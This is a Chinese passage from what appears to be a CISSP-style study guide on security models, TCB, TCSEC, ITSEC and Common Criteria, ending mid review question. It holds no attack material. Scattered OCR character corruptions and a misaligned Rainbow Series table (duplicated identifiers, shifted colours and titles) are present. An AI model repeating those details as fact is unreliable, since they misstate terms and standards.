限制软件设计人员使用进程限制来约束程序的操作。简单来讲，进程限制允许进程只能在确定的内存地址和资源中读取和写入数据。这就是常说的沙箱。操作系统或其他一些安全组件不允许非法的读/写请求。如果进程试图执行的动作超出了为其授予的权限，那么动作会被拒绝，并且系统将采取进一步的行动，例如记录违法行为的日志。必须符合更高安全性评级的系统通常记录所有违规行为以及通过某些具体方式做出的响应。一般情况下，违规的进程会被终止。限制可以在操作系统中进行(如通过进程隔离和保护)，也可通过限制应用程序或服务(例如，www.sandboxie.com的Sandboxie)的使用来进行，或通过虚拟化或虚拟机(如VMware或Oracle的VirωalBox)解决方案来进行。 界限在系统上运行的每一个进程都被分配了一个授权级别。授权级别告知操作系统进程可以执行哪些操作。在比较简单的系统中，可能只存在两个授权级别： 用户和内核。授权级别告知操作系统该如何为进程设定界限。进程的界限由对进程可以访问的内存和资源所设置的限制组成。进程在界限所划定的区域之内。在大多数系统中，这些界限为每个进程划分其使用的内存逻辑区域。操作系统负责实施这些逻辑界限并且不准许其他进程访问。更安全的系统要求从物理上限制进程。物理界限要求每个被限制的进程所运行的内存区域与其他受限进程的内存区域，通过物理方式隔开而不仅仅使用相同内存空间中的逻辑界限。对内存实施物理界限可能非常昂贵，但是也比逻辑界限更为安全。 隔离当通过实施访问界限对进程进行限制时，进程就运行在隔离状态中。进程隔离能够确保任何行为只影响与隔离进程有关的内存和资源。隔离用来保护操作环境、操作系统的内核和其他独立的应用程序。隔离是稳定操作系统的重要组成部分之一。隔离能防止某个应用草里芋访问只属于另一个应用程序的内存或资源，无论是好意的还是恶意的。操作系统可以提供中间服务，如剪切、粘贴和资源共享(如键盘、网络接口和存储设备访问)。 上述三个概念(限制、界限和隔离)使安全程序和操作系统的设计工作变得更为困难，但能使实现更安全的系统成为可能。 8.1.4 控制 控制使用访问规则来限制主体对客体的访问。访问规则声明了每个主体相对应的合法客体。有两种控制： 强制访问控制和自主访问控制，分别被称为MAC(Mandatory A∞ess Control)和DAC(Discretionary Acc棚Control)。在强制访问控制中，主体和客体的静态特性被用于确定访问的容许性。每个主体所具有的特性，定义了其访问资源的许可或授权。每个客体所具有的特性，定义了其分类。不同类型的安全方法以不同的方式为资源分类。自主访问控制与强制访问控制的不同之处在于：主体具有一些定义访问客体的能力。在受到限制的情况下，自主访问控制允许主体根据需要定义访问客体的列表。这个访问控制列表作为动态的访问规则组，并且主体能够对其进行修改。更改己实施的限制，通常与主体的身份有关。根据主体的身份，可以允许主体增加或修改访问客体的规则。强制访问控制和自主访问控制都限制主体对客体的访问。访问控制的主要目的是： 通过阻止授权或未经授权主体的未授权访问，从而确保数据的机密性和完整性。 8.1.5 信任与保证 可信系统是所有保护机制都协同工作的系统，从而能够在维护稳定和安全的计算环境的同时，为许多类型的用户处理敏感数据。保证被简单地定义为： 满足安全需求的可信度。保证必须被持续地维持、更新和重新验证。无论可信系统经历己知的变化还是经过大量时间，这一点都是正确的。变化往往是安全的对立面，并且常常降低安全性。保证对于不同系统是不同的，并且必须针对单独系统分别建立。不过，某些保证等级或级别可以适用于许多类型相同的系统、支持相同服务的系统或部署在相同地理位置的系统。因此，信任可以通过具体的安全功能集成到系统中，而保证是在现实世界中对安全功能的可靠性和可用性的评估。 8.2 理解安全模型的基本概念 在信息安全中，模型提供了一种正式的安全策略的方式。安全模型允许设计人员将抽象语句映射为描述构建硬件和软件所需算法和数据结构的安全策略。因此，安全模型使软件设计人员能够衡量自己的设计和实现。当然，这种模型必须支持安全策略的每个部分。通过这种方式，开发人员就能确认自己的安全实现可以支持安全策略。这些模型都阐明了如何在计算机体系结构和操作系统设计中加入安全性： 可信计算模型 状态机模型 信息流模型 非干扰模型 Take-Grant模型 访问控制表 Bell-LaPadula模型 Biba模型 Clark-Wilson模型 Brewer and Nash模型(也被称为Chinese Wall模型) Goguen-Messguer模型 Sutherland模型 Graham-Denning模型 如果某个安全的系统遵循特定的安全标准组，那么就可以说这个系统具备某种信任级别。因此，信任可以被构建在系统内，随后能够被评估、认证和认可。但是在讨论每种安全模型之前，必须建立构建大多数安全模型的基础。这个基础就是TCB(Trusted Computing Base，可信计算基础) 。 8.2.1 可信计算基础 TCB是完整信息系统的一个子集，并且应当尽可能小，从而使详细的分析能够确保系统满足设计规范和要求。TCB是系统可以信任的遵守和实施安全策略的唯一部分。系统的每个组件并不需要都是可信任的。不过，从安全性的角度考虑系统时，评估中应该包括定义系统TCB的所有可信组件。 安全边界系统的安全边界是一条假想的界限，它将TCB与系统的其他部分隔开。这条边界确保TCB与计算机系统中其他部件的不安全通信或交互不会发生。因为TCB要与系统的其他部分进行通信，所以安全边界必须建立安全的通道，也被称为可信路径。可信路径是建立在有着严格标准基础上的通道，在不受TCB安全脆弱性影响的情况下准许进行必要的通信。可信路径也保护系统用户(有时也称为主体)不受因TCB交换导致的危害。 引用监控器和内核在实现安全系统时，必须利用TCB的某部分来实施针对系统资产和资源(有时称为客体)的访问控制。在准许访问请求之前验证对每种资源的访问的这部分TCB被称为引用监控器。引用监控器处于每个主体和客体之间，并且在准许进行任何访问请求之前验证请求主体的凭证是否满足客体的访问需求。如果不满足这种访问需求，那么访问请求就会被拒绝。实际上，引用监控视器是TCB的访问控制执行者。因此，授权和安全的行动和活动被允许发生，而未经授权的和不安全的活动和行动被拒绝并阻止发生。引用监控器对访问控制或授权的强制基于所需的安全模型，无论是自由支配的、强制性的、基于角色的还是访问控制的一些其他形式。引用监控器可能是TCB概念的一部分;它并不需要是一个实际的、独立的或独立工作的系统组成部分。 共同工作从而实现引用监控器功能的TCB 中组件的集合被称为安全内核。引用监控器是一种通过软件和硬件中的安全实现来实施的概念或理论。安全内核的目的是使用适当的组件实施引用监控器的功能和抵抗所有己知的攻击。安全内核使用一条可信路径与主体进行通信，并且还可以作为所有资源访问请求的中间人，从而只允许那些与系统应用的适当访问规则相匹配的请求。引用监控器要求具有与其保护的每种资源相关的描述性信息。这种信息通常包括资源的分类级别和名称。当某个主体请求访问某个客体时，引用监控器会查阅客体的描述性信息，从而判断应当准许或拒绝访问。 8.2.2 状态机模型 状态机模型描述了一个无论处于何种状态下总是安全的系统，这种模型基于有限状态机(Finite State Machine，FSM)的计算机科学定义。FSM通过组合外部输入和内部计算机状态来建立所有类型的复杂系统的模型，包括解析器、解码器和解释器。给定一个输入和一个状态，FSM 就会转换至另一个状态，并且可能生成一个输出。从数学上讲，下一状态是当前状态和输入的函数： 下一状态=F(输入，当前状态)。同样，输出也是输入和当前状态的函数： 输出=F(输入，当前状态)。 如果某个状态的所有方面都满足安全策略的要求，那么这个状态就被认为是安全的。接受输入或生成输出时都会发生转换操作。转换操作总是会产生新的状态(也被称为状态转换)。所有的状态转换都必须进行评估。如果每个可能的状态转换都会导致另一个安全状态，那么系统就会被称为安全状态机。安全状态机模型系统，总是会进入一个安全状态(在所有的转换中维护安全状态)，并且准许主体只以遵循安全策略的安全方式访问资源。安全状态机模型是其他许多安全模型的基础。 8.2.3 信息流模型 信息流模型以状态机模型为基础。信息流模型被设计用于避免未授权的、不安全的或受限的信息流。信息流模型可以防止未经授权的所有信息流，无论是在同一分类级别不同的分类级别之间。在相同客体的两种版本或状态存在于不同的时间点时，信息流模型被用于建立这两种版本或状态之间的关系。因此，信息流指示了客体从某个时间点的一个状态向另一个时间点的另一个状态的转变。信息流模型也可通过排除所有不确定的流途径来解决隐敲通道。 8.2.4 无干扰模型 无干扰模型松散地建立在信息流模型的基础上。然而，无干扰模型关注的是位于较高安全级别的主体的动作如何影响系统状态，或关注于位于较低安全级别的主体的动作，而不是关注于信息流。 8.2.5 Take-Grant模型 Take-Grant模型采用有向图来指示权限如何从一个主体传递至另一个主体或者如何从一个主体传递至一个客体。 具有授权资格的主体可以向另一个主体或客体授予其所拥有的其他任何权限。同样，具有获得权限能力的主体可以从另一个主体获得权限。除了这两条主要的规则，Take-Grant(取-予)模型可采取创建规则和移除规则来生成或删除权限。这种模型的关键是使用这些规则可以让你弄清楚在系统中哪些权限可以改变，哪些可能发生泄漏(即许可权限的意外分自己)，如下表： 规格名 作用 获取规则 允许主体获取客体的权限 授予规则 允许主体向客体授予权限 创建规则 允许主体创建新权限 移除规则 允许主体移除己有的权限 8.2.6 访问控制矩阵 访问控制矩阵是一个由主体和客体组成的表，这个表指示了每个主体可以对每个客体执行的动作或功能。访问控制矩阵的每一列都是一个访问控制列表： 表的每一行都是功能列表。ACL与客体相关，它列出了每个主体可以执行的有效动作。功能列表与主体相关，它列出了可以在所有客体上执行的有效动作。 8.2.7 Bell-LaPadula模型 为了解决保护分类信息的问题，美国国防部(Department ofDefense，DoD)在20 世纪70 年代开发了Bell-LaPadula模型。Bell-LaPadula模型通过阻止较低分类级别的主体访问较高分类级别的客体，防止了分类信息泄漏或传输至较低的安全许可级别，解决了确保文档机密性所涉及的复杂性问题。然而，Bell-LaPadula模型没有说明客体的完整性或可用性方面的内容。Bell-LaPadula模型也是多级安全策略的首个数学模型。 Bell-LaPadula模型以状态机概念和信息流模型为基础。这种模型还采用强制访问控制和格子型概念。格子等级是由组织机构的安全策略使用的分类级别。状态机支持在任何两个状态之间都能够显式转换多个状态; 使用这个概念是因为能够以数学方式证明计算机的正确性以及对文档机密性的保证。这种状态机具有下列三种属性： 简单安全属性(simple security property)规定主体不能读取位于较高敏感度级别的信息(也就是不能向上读)。 安全属性((star)security prope即)规定主体不能在位于较低敏感度级别的客体上写入信息(也就是不能向下写)，这也被称为约束属性(confinement property)。 自主安全属性(discretionary security property)规定系统使用访问控制矩阵来实施自主访问控制。 前两个属性定义了系统可能转换到的状态。其他的转换都是不被准许的。所有通过这些规则可以访问的状态都是安全状态。因此，Bell-LaPadula模型系统提供了状态机模型的安全性。 Bell-LaPadula属性有效地保护了数据的机密性。主体不能读取分类级别高于其级别的客体。因为一个级别上的客体所具有的数据比较低级别上的数据更为敏感或秘密，所以主体不能将某个级别的数据写入较低级别的客体(除了可信主体之外)。这个动作类似于将绝密备注粘贴到非机密的文档文件中。此外，第三种属性实施了主体能够访问客体的”知其所需”权限。 Bell-LaPadula模型只解决数据的机密性问题，但是没有涉及数据的完整性和可用性。不支持目前常见的许多操作，例如文件共享和网络连接。这种模型还说明了安全层之间的安全转换，但是并没有涉及隐蔽通道问题。Bell-LaPadula模型很好地处理了机密性问题，因此常常与其他处理完整性和可用性机制的模型组合使用。 8.2.8 Biba模型 Biba模型是仿照Bell-LaPadula模型设计的。Bell-LaPadula模型解决了机密性问题，而Biba模型则解决了完整性问题。二者的最大差异是关注的主要目标不同： Biba模型主要保护数据的完整性。下面列出了Biba模型状态机的基本属性： 简单完整性属性(simple integrity property)规定主体不能读取位于较低完整性级别的客体(也就是不能向下读)。 完整性属性((star)integrity property)规定主体不能更改位于较高完整性级别的客体(也就是不能向上写) 。 Biba模型被设计用于解决下列三个完整性问题： 防止未授权的主体对客体的修改。 防止己授权的主体对客体进行未授权的修改。 保护内部和外部客体的一致性。 Biba模型有以下列几个缺陷： 只解决了完整性问题，没有解决机密性或可用性问题。 专注于保护客体不受外部的威胁; 假定内部的威胁己被有计划地控制。 没有说明访问控制管理，也没有提供分配或改变主体或客体分类级别的方法。 并没有防止隐蔽通道。 8.2.9 Clark-Wilson模型 这种模型使用多层面途径来实施数据完整性。Clark-Wilson模型没有定义正式的状态机，而是只通过一小组程序来定义每个数据项井允许修改。Clark-Wilson模型并不要求使用格子型结构，而是使用被称为三元组或访问控制三元组的主体/程序/客体(或主体/事物/客体)的三部分关系。主体并不对客体进行直接访问。客体只能通过程序进行访问。通过使用下列两条原则： 格式良好的事务处理和职责分离，Clark-wilson模型提供了保护完整性的有效方法。Clark-Wilson模型定义了下列数据项和过程： 约束数据项(Constrained Data Item，CDI)：是指完整性由安全模型保护的任何数据项。 非约束数据项(Unconstrained Data Item，UDI)：是指不受安全模型控制的任何数据项。作为输入且未验证的任何数据或任何输出都被视为非约束数据项。 完整性验证过程(lntegrity Verification Procedure，IVP)：扫描数据项并确认其完整性的过程。 转换过程(Transformation Pro臼dure，TP)：TP是允许更改CDI的唯一过程。通过TP限制对CDI的访问而形成Clark-Wilson完整性模型的主干(我们想知道这是否是TPS报告的来源)。 Clark-Wilson模型使用安全标签来授予对客体的访问权限，但是只能通过转换过程和受限接口模型来完成。受限接口模型使用基于分类的限制，并且只提供主体特定的授权信息和功能。Clark-Wilson模型实现了职责分离。 8.2.10 Brewer and Nash模型(也叫作Chinese Wall) 创建这种模型的目的是准许访问控制基于用户以前的活动而动态改变(这也使其成为一种状态机模型)。这种模型应用于单个集成的数据库，并且试图创建对利益冲突敏感的安全域。因为创建了一个数据类，这个数据类定义了哪些安全域存在潜在的冲突，对于能够访问某个属于特定冲突类的安全域的任何主体，阻止他们访问属于相同冲突类的其他任何安全域，所以这种模型被称为Chinese Wall模型。 8.2.11 Goguen-Meseguer模型 Goguen-Meseguer模型是一个完整性模型，这个模式被称作非干涉概念理论的基础。Goguen-Meseguer 模型基于主体可以访问的预设的域或客体列表。该模型基于自动化理论和域的隔离。这意味着主体只允许对预设客体执行预定的动作。当类似的用户被分组到他们自己的域(也就是集合)时，一个主体域的成员不能干扰另一个主体域的成员。因此，客体无法干扰其他客体的活动。 8.2.12 Sutherland模型 Sutherland 模型是一个完整性模型。它的重点是预防对完整性支持的干扰。它正式地基于状态机模型和信息流模型。然而，它并没有直接表明保护完整性的具体机制。相反，该模型基于定义一组系统状态的想法，以及初始状态和状态转换。通过使用这些预定的安全状态来保护完整性和阻止干扰。 8.2.13 Graham-Denning模型 Graham-Denning模型关注主体和客体在创建和删除时的安全性。Graham-Denning模型集合了8个主要的定义特定安全行为边界的保护规则或动作： 安全创建客体 安全创建主体 安全删除客体 安全删除主机 安全读访问权限 安全授予访问权限 安全删除访问权限 安全转移访问权限 通常，一组客体上的主体的特定能力或权限被定义在访问矩阵中(又名访问控制矩阵)。 8.3 基于系统安全评估模型选择控制和对策8.3.1 彩虹系列 自20世纪80年代以来，政府、机构、团体和各种商业组织都不得不面对涉及信息系统挑选和使用的风险。这种情况导致近年来出现了一系列信息安全标准，这些标准试图为各种使用类别指定最低的可接受安全标准。当购买者希望获得和部署能够保护和保留其内容，或者能够满足各种强制安全需求(例如，承办商管理与政府相关的业务时按手续必须满足的需求)的系统时，这些使用类别十分重要。在美国国防部(DoD)致力于为购买和使用的系统开发和实施安全标准时，第一组这样的标准导致在20世纪80年代出现可信计算机系统评估标准(TCSEC)。随后，在20世纪90年代中期，这个系列的所有标准都被公布出来。因为往往可以通过封面颜色来标识这些被公布的标准，所以它们被合称为彩虹系列。 8.3.2 TCSEC分类和所需功能 TCSEC将系统提供的功能性和机密性保护等级保证组合为4个主要类别。这些类别随后又被进一步划分为使用数字标识的子类别(例如，C1和C2)。进一步说，TCSEC的类别是通过对目标系统的评估来指派。TCSEC适用的系统是没有互联的独立系统。TCSEC定义了下列主要类别： 类别A 己验证保护，这是最高的安全级别 类别B 强制性保护 类别C 自主性保护 类别D 最小化保护，提供给那些被评估但不符合要求且属于其他类别的系统定级之用 级别标签 需求 D 最小化保护 C1 自主性保护 C2 受控访问保护 B1 标签式安全 B2 结构化保护 B3 安全域 A1 已验证保护 自主性保护(类别C1、C2) 自主性保护系统提供了基本的访问控制。这个类别中的系统的确能提供一些安全控制方法，但是缺乏针对安全系统特定需要的更复杂且更严格的控制方法。C1和C2类别的系统提供了基本的控制和用于系统安装与配置的完整文档。 自主性安全保护(类别C1) 自主性安全保护系统通过用户D和/或用户组来实现访问控制。虽然对客体的访问采取了一些控制措施，但这个类别中的系统只能提供较弱的保护。 受控访问保护(类别C2) 受控访问保护系统的安全性强于C1系统。用户必须被单独标识后才能获得访问客体的权限。C2系统还必须实施介质清除措施。如果实施了介质清除措施，那么在另一位用户重新使用介质之前，必须首先彻底地清除介质上的内容，从而保证不会保留先前的数据供检查和使用。此外，也必须实施限制无效或未授权用户访问的严格登录措施。 强制性保护(类别B1、B2、B3) 强制性保护系统比类别C或D的系统提供了更多的安全控制方法。因为强制实施了更细粒度的控制，所以安全管理员能够应用只允许非常有限的主体/客体组访问的特定控制手段。这个系统类别以Bell-LaPadula模型为基础。强制访问控制基于安全标签。 标签式安全(类别B1) 在标签式安全系统中，每个主体和客体都有一个安全标签。通过匹配主体和客体的标签并比较它们的权限兼容性，B1系统授予了访问权限。B1系统提供了足够的安全保护来保留己分类的数据。 结构化保护(类别B2) 除了要求具有安全标签之外(就像在B1系统中一样)，B2系统必须确保不存在隐蔽通道。操作者和管理员的职责被分隔开，并且进程也被隔离。如果分类数据需要高于B1系统的安全功能性，B2系统可以满足需要。 安全域(类别B3) 通过进一步增加无关进程的分隔和隔离，安全域系统提供了更多的安全功能性。管理功能被清楚地定义并与其他用户可以使用的功能分开。B3系统的关注点转移到简易性，从而减少了在未用的或多余的代码中所暴露出来的脆弱性。因系统的安全状态也必须在初始启动过程中被说明。因系统难以被成功攻击，并且为非常敏感的或秘密的数据提供了充分的安全控制。 己验证保护(类别A1) 己验证保护系统在结构和使用的控制方面与B3系统类似。二者的差别在于开发周期。开发周期的每个阶段都使用正式的方法进行控制。在执行下一个步骤之前，设计的每个阶段都要被记入文档、评估和验证。在开发和部署的所有阶段都给予极高的安全关注度，并且是正式保证系统强安全性的唯一方式。 8.3.3 彩虹系列中的其他颜色 红皮书 因为桶皮书只应用于未连接到网络的独立计算机，而如此多的系统却连接到网络(即使在20世纪80年代也是如此)，所以红皮书被开发出来用于在网络互联环境中解释说明TCSEC。事实上，红皮书的正式标题是”可信网络解释”，因此可以被视为致力于从网络连接角度对桶皮书进行解释说明。下面列出了红皮书的其他一些功能： 评定机密性和完整性的等级 解决通信的完整性问题 解决拒绝服务的防护问题 解决危害(也就是入侵)的防护和阻止问题 受限于被标记为”使用单个鉴定授权的集中式网络”的有限网络类别 只使用4种等级级别：None、Cl(Minimum)、C2(Fair)以及B2(Good)。 绿皮书 绿皮书或者称为”美国国防部密码管理指导原则”提供了创建和管理密码的指导原则。对于配置和管理可信系统的人来说，绿皮书十分重要。 下面提供了彩虹系列的一个更完整的书籍列表： 发表编号 标题 名称 5200.28-STD DoD可信计算机系统评估标准 橘皮书 CSC-STD-002-85 DoD 密码管理指导原则 绿皮书 CSC-STD-003-85 在特定环境中应用TCSEC的指南 黄皮书 NCSC-TG-001 理解可信系统审计的指南 褐皮书 NCSC-TG-002 可信产品评估：供应商指南 天蓝皮书 NCSC-TG-002-85 PC安全考虑 浅蓝皮书 NCSC-TG-003 理解可信系统中任意访问控制的指南 氖桶皮书 NCSC-TG-004 计算机安全术语词汇表 浅绿皮书 NCSC-TG-005 可信网络解释 红皮书 NCSC-TG-004 理解可信系统中配置管理的指南 琉珀皮书 NCSC-TG-006 理解可信系统中设计文档的指南 暗红皮书 NCSC-TG-008 理解可信系统中可信分发的指南 浅紫皮书 NCSC-TG-009 TCSEC中计算机安全子系统的解释 威尼斯蓝皮书 随着时代的发展和技术的更新，下面列出的对TCSEC 的主要批评能够解释目前普遍使用更新标准的原因： 尽管TCSEC重点考虑控制用户对信息的访问，但是并没有控制用户一旦获得访问权限后如何对信息进行处理。在军事和商业应用中，这都是问题。 考虑到来自于美国国防部，因此可以理解TCSEC标准关注的重点完全在于机密性，该标准认定控制用户访问数据的方式意味着不必关注数据的准确性或完整性。在认为数据的准确性和完整性比机密性更重要的商业环境中，TCSEC不起作用。 除了自身强调访问控制之外，TCSEC并不仔细处理完全实现安全策略所必需的各种人员、物理和过程化的策略问题或防范措施。此外，TCSEC也不处理影响系统安全性的问题。 橘皮书本质上并不处理网络连接问题(尽管之后在1987年开发的红皮书能够解决类似问题)。 8.3.4 ITSEC类别与所需的保证和功能性 ITSEC指导原则使用不同的类别等级来评估系统的功能性和保证。在这种环境下，系统的功能性是针对系统用户的实用价值进行衡量。系统的功能性等级描述了系统基于设计和预期目的执行所需功能的情况。保证等级表示系统以一致的方式正常工作的可靠程度。ITSEC将正在被评估的系统作为评估目标(Target OfEvaluation，TOE)。所有的等级都以两种类别表示为TOE等级。ITSEC使用两个尺度来评定功能性和保证的等级。TCSEC和ITSEC之间的差异十分多样化。下面列出了两个标准之间的一些重要差异： 尽管TCSEC几乎只关注机密性，但是ITSEC除了机密性之外还关注TCSEC缺少的完整性与可用性，因此覆盖了对于维护完整信息的安全性十分重要的所有三个元素。 ITSEC并不依赖于TCB的概念，并且不要求系统的安全组件在TCB内是隔离的。 TCSEC要求任何发生变化的系统都要重新进行评估，这些变化包括操作系统的升级、安装补丁或修复，以及应用程序的升级或变化等; ITSEC在这些变化之后不要求进行新的正式评估，而是只维护评估目标。 8.3.5 通用准则1. 通用准则的认可 下面列出了CC指导原则的目标： 增加购买者对己评估和己划分等级的IT产品的安全性的信心。 消除重复评估(除其他外，如果某个国家、机构或验证组织对特定系统的评定等级和配置遵循CC，那么其他国家、机构或验证组织就不需要进行重复的工作)。 使安全评估和认证过程更有效益和效率。 确保IT产品的评估遵循高且一致性标准。 促进评估，并且增强己评估和己划分等级的IT产品的可用性。 评估TOE的功能性(也就是系统的功能)和保证(也就是系统的被信任程度)。 通用准则过程基于两个关键元素： 保护轮廓和安全目标。保护轮廓(Protection Profiles，PP)指定被评估产品(TOE)的安全需求和保护，这也是客户考虑的安全要求或”希望达到的标准”。安全目标(Security Targets，ST)指定了供应商在TOE内构建的安全声明。ST被视为己实现的安全措施或供应商”提供的安全目标”。 2. 通用准则的结构 CC指导原则被分为下列三部分： 介绍和一般模型描述(lntroduction and General Model)用于评估IT安全性和指定评估目标时涉及的一般概念与基本模型。对于不熟悉安全评估工作过程的人，或者阅读和解释评估结果时需要寻求帮助的人来说，这部分是非常有用的介绍和说明材料。 安全功能需求(S巳curity Functional Requirement)描述与安全审计、通信安全、安全性的密码学支持、用户数据保护、身份标识和身份认证、安全管理、TOE安全功能σSF) 、资源利用、系统访问以及可信路径有关的各种功能需求。这部分覆盖CC评估过程中能够预想到的完整安全功能范围，井且还具有解释每个功能区域的额外附录。 安全保证(Security Assurance)涉及TOE在配置管理、传送和操作、开发、指导文档与生命周期支持领域的保证需求，以及保证测试和脆弱性的评估。这部分覆盖CC评估过程中预想到的安全保证检查和保护轮廓的完整范围，并且还具有与描述如何设计、检查和测试系统的评估保证级别相关的信息。 3. 行业和国际安全实施指南 支付卡行业数据安全标准(PCI-DSS)是提高电子支付交易安全要求的集合。这些标准由PCI 安全标准委员会的成员进行制订，这些成员主要来自信用卡银行和金融机构。PCI-DSS 定义了安全管理、策略、手里亨、网络架构、软件设计的要求及其他关键的保护措施。 国际标准化组织(ISO)是由不同国家标准组织的代表组成的世界性标准组织。国际标准化组织定义了工业和商业设备、软件、协议、管理以及其他的标准，有6 个主要产品： 国际标准、技术报告、技术规范、公开规格、技术勘误表和指南。ISO 标准己被许多行业广泛接受，甚至被采纳为各国政府的要求或法律。 8.3.6 认证和鉴定 要求系统安全的组织需要通过一种或多种方法来评估系统满足安全要求的幸自支。正式的评估过程被分为两个阶段：认证和鉴定。每个阶段要求的实际步骤取决于组织选择的评估标准。认证和鉴定过程用来评估应用程序的有效性，以及操作系统和硬件的安全性。评估的过程为评价系统在多大程度上达到所期望的安全级别提供了一种衡量方法。因为每个系统的安全级别取决于很多因素，所以在评估过程中必须考虑所有这些因素。 认证认证是对IT系统的技术和非技术安全特性以及其他防护措施的综合评估，这能够支持鉴定过程，从而确定特定设计和实现满足一组指定安全要求的程度。系统认证是对计算机系统的每个部分进行技术性评估，以便评估系统与安全标准是否一致。首先，必须选择评估标准(我们将会在稍后部分探讨可以选择的标准) 。一旦选择使用的标准，就要分析每个系统组件，以确定其是否达到所期望的安全目标。在评估完整个系统之后，可以对结果进行评估，以便决定系统在当前环境中支持的安全级别。系统的环境是认证分析过程的一个关键部分，因此系统的安全性或多或少地依赖于其所处的环境。安全系统与网络连接的方式会改变系统的安全状况。系统周围的物理安全保护措施也会影响整体的安全等级。因此，在认证系统时，必须全面考虑所有的因素。 鉴定鉴定是由指定许可机构(Designated Approving Au也ority，DAA)做出的正式声明，它表明准许IT系统使用规定的一组防护措施在可接受的风险级别以特定的安全模式运作。鉴定一旦完成，管理层就可以正式接受被评估系统的总体安全性的适用性。认证和鉴定的过程通常是一个不断重复的过程。在鉴定阶段，请求通过改变系统配置或增加控制来解决安全问题的情况时有发生。需要记住的是，只要更改了配置，就必须重新认证新的配置。同样，当经过一段具体的时间后或进行了任何配置变更后，都必须重新认证系统。安全策略应当明确指出什么样的情况需要进行重新认证。优良的安全策略会列出认证有效的时间以及要求重新开始认证和鉴定过程的任何更改。 认证和鉴定系统目前有下列两种政府标准适用于计算系统的认证和鉴定：美国国防部标准是风险管理框架(RMF)和美国国家安全系统委员会策略(CNSSP)。这些过程都分为4个阶段： 定义 涉及适当的项目人员分配、关键需求的记录以及指导整个认证和鉴定过程的系统安全许可协议(System Security Authorization Agreement，SSAA)的注册、协商和创建。 验证 包括细化SSAA、系统开发活动以及认证分析。 确认 包括进一步细化SSAA、集成系统的认证评估、DAA建议的开发以及DAA的鉴定结果。 后鉴定 包括维护SSAA、系统操作、变更管理以及遵从性验证。 8.4 理解信息系统的安全功能 信息系统的安全功能包括内存保护、虚拟化、可信平台模块、接口和容错能力。认真评估基础设施的各方面，并确保充分支撑安全是非常重要的。 8.4.1 内存保护 内存保护是一个核心的安全组件，必须对它进行设计和在操作系统中加以实现。无论程序是否在系统中执行，它都必须被执行。否则将导致不稳定、完整性的违反、拒绝服务以及信息泄露的结果。内存保护被用于防止活动进程与没有专门指派或分配的内存区域进行交互。 8.4.2 虚拟化 虚拟化技术被用于在单一主机的内存中运行一个或多个操作系统。这种机制允许在任意硬件上虚拟运行任何操作系统，也允许多个操作系统同时工作在相同的硬件上。虚拟化有很多好处，比如能够启动单个服务或需要的服务实例，还能实时扩展，以及能够为特殊的服务运行额外的OS版本。从用户的角度来看，虚拟化的服务器和服务与传统的服务器和服务是没有区别的。此外，损坏、崩溃或毁坏的虚拟系统的恢复通常很快，只需简单使用干净的备份版本替换虚拟系统的主硬盘文件，然后重新启动就可以了。 8.4.3 可信平台模块 可信平台模块(TPM)既是对主板上加密处理器芯片的描述，同时也是描述实施的通用名称。TPM芯片用于存储和处理加密密钥，从而满足基于硬件支持/实现的硬盘加密系统。当使用基于TPM的全磁盘加密技术时，用户/操作员必须提供一个密码或物理USB令牌设备给计算机用于身份认证，并允许TPM芯片向内存释放硬盘加密密钥。 硬件安全模块(HSM)用于管理/存储数字加密密钥、加速加密操作、支持更快的数字签名，以及提高身份认证的速度。HSM通常是附加的适配器、外部设备或是TCP/IP网络设备。HSM包括防篡改保护以防止滥用，即便攻击者可以对其进行物理访问。TPM就是一个HSM示例。HSM提供大型(2048位以上)非对称加密计算的加速解决方案，以及密钥存储安全保护。许多认证系统使用HSM来存储证书;ATM和POS终端通常采用专有的HSM;硬件SSL加速器可以包括HSM支持;兼容DNSSEC的DNS服务器使用HSM提供密钥和区域文件存储。 8.4.4 接口 在应用程序中，使用约束或受限接口的目的是限制用户在基于他们的权限上可以做什么或看到什么。具有全部权限的用户可以访问应用程序的所有功能。有限制权限的用户则被限制访问。应用程序使用不同的方法来限制接口。约束接口的目的是限制或制止授权和未经授权用户的行为。这接口的使用就是Clark-Wilson安全模型的一种实践应用。 8.4.5 容错 容错能力是指系统遭受故障，但能持续运行的能力。容错是安全设计的一个基本要素，被认为是避免单点故障和实现冗余的部分措施。 8.5 考试要点 了解每种访问控制模型的细节 了解各种访问控制模型及其功能。状态机模型确保主体访问客体的所有实例都是安全的。信息流模型被设计用于阻止非授权的、不安全的或受限的信息流。非干扰模型能够阻止一个主体的动作影响另一个主体的系统状态或动作。Take-Grant模型规定了如何将权限从一个主体传递至另一个主体或者从一个主体传递至一个客体。访问控制矩阵是一个由主体和客体形成的表，这个表规定了每个主体能够在每个客体上执行的动作或功能。Bell-LaPadula主体具有一个许可级别，这个许可级别只允许访问具有相应分类级别的客体。Biba模型能够防止具有较低安全级别的主体对具有较高安全级别的客体进行写操作。Clark-Wilson是一个依赖于审计的完整性模型，能够确保未授权的主体无法访问客体以及被授权的用户能够正确地访问客体。Biba和Clark-Wilson模型实现了完整性。Goguen-Meseguer和Sutherland模型关注于完整性。Graham-Denning模型关注于主体和客体的安全建立和删除。 了解认证和鉴定的定义 认证是从技术角度评估计算机系统的每个部分，从而判断是否与安全标准相一致。鉴定是正式验收己认证的配置的过程。 能够描述开放式系统和封闭式系统 开放式系统是使用行业标准设计的，一般比较容易与其他的开放式系统进行整合。封闭式系统通常是专有硬件和/或软件，它们的设计规范一般不会公开，并且往往较难与其他系统进行整合。 知道限制、界限和隔离的含义 限制是对进程从特定内存地址读取(和写入)数据进行限制。界限是进程在读取或写入数据时不能超越的特定内存地址的范围。隔离是通过使用内存界限而将进程加以限制的一种运行模式。 能够从访问资源的角度定义客体和主体 访问的主体是提出访问资源请求的用户或进程。访问请求的客体是用户或进程希望访问的资源。 了解安全控制的工作原理及功能 安全控制使用访问规则来限制主体对客体的访问。 能够列出TCSEC、ITSEC 和通用准则的类别 TCSEC的类别包括己验证保护、强制性保护、自主性保护和最小化保护。概述并比较了TCSEC、ITSEC和CC的相当且适用的等级(需要记住的是，ITSEC中从F7到F10的功能性等级没有对应的TCSEC等级)。 定义可信计算基(TCB) TCB 组合了硬件、软件和控制(形成了实施安全策略的可信基)。 能够解释安全边界 安全边界是想象出来的，用于将TCB与系统其余部分分隔的界限。TCB组件与非TCB组件之间的通信使用可信路径。 知道什么是引用监控器和安全内核 引用监控器是TCB的逻辑部分，对主体在被授予访问权限之前是否具有使用资源的权限进行确认。安全内核是实现引用监控器功能的TCB组件的集合。 了解信息系统的安全功能。 常见的安全功能包括内存保护、虚拟化和可信平台模块(TPM)。 8.6 复习题 系统认证是什么?A. 正式接受确定的系统配置B. 